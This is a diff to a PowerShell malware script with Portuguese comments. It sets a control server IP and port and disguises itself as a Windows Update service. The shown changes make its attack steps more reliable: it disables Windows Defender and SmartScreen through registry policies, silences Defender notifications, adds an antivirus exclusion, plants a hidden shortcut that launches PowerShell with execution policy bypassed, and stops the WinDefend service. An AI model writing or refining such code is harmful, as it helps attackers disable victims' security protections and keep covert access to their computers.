@@ -8,7 +8,7 @@ Version: 10.0.19045.1
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # ⚠️ MUDE PARA SEU IP
+$serverIP = "195.1.195.194"  # ⚠️ MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -67,16 +67,20 @@ if ($isAdmin) {
         Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
         
         # Desabilitar via Registry (mais persistente)
-        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWORD -Force | Out-Null
-        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
+        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
         
         # Desabilitar SmartScreen
-        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType DWORD -Force | Out-Null
+        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
         
         # Desabilitar notificações do Defender
-        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
         
         # Adicionar exclusão para este script
         Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\Caches" -ErrorAction SilentlyContinue
@@ -167,7 +171,7 @@ try {
     $Shortcut = $WshShell.CreateShortcut($lnkPath)
     $Shortcut.TargetPath = "powershell.exe"
     $Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-    $Shortcut.WindowStyle = 7 # Minimized
+    $Shortcut.WindowStyle = 7
     $Shortcut.Save()
     
     # Ocultar o atalho
@@ -270,7 +274,8 @@ function Disable-Antivirus {
         Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
         
         # Registry
-        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
         
         # Parar serviços
         Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
